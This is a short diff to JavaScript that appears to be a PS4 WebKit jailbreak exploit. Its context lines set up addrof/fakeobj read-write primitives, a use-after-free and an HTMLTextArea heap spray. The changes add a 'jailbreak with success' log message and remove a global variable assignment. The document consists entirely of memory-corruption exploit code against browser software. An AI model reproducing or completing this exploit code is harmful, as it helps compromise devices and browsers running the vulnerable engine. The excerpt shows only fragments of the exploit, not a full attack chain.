@@ -115,6 +115,7 @@ function setupRW() {
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	debug_log("[+] Succesfully got addrof/fakeobj");
+	debug_log("[+] PS4 Jailbreak With Success!!!");
 
 	/* Getting code execution */
 	/* ... */
@@ -413,7 +414,7 @@ function prepareUAF() {
 function sprayHTMLTextArea() {
 	debug_log("[+] Spraying HTMLTextareaElement ...");
 
-	let textarea_div_elem = window.xyu = document.createElement("div");
+	let textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
 	var element = document.createElement("textarea");
